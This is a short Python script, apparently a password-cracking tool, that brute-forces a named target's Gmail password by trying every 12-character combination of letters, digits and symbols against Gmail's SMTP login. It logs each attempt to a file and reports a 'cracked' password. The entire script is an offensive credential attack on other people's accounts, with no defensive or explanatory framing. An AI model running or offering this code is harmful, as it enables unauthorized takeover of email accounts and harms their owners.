import itertools 
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter Target's Gmail Address: ")
def print_perms(chars, minlen, maxlen): 
    for n in range(minlen, maxlen+1): 
        for perm in itertools.product(chars, repeat=n): 
            yield ''.join(perm) 

for symbols in print_perms("AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz!1@2#3$4%5^6&7*8(9)0,./;[]+_<>?:{}|`~-=", 12, 12):
    try:
        password = symbols
        smtpserver.login(user, password)

        print ("[+] Password Cracked: %s" % symbols)
        break;
    except smtplib.SMTPAuthenticationError:
        print ("[!] Trying: %s" % symbols)
        with open('tried.txt', 'a') as f:
            f.write(symbols + '\n')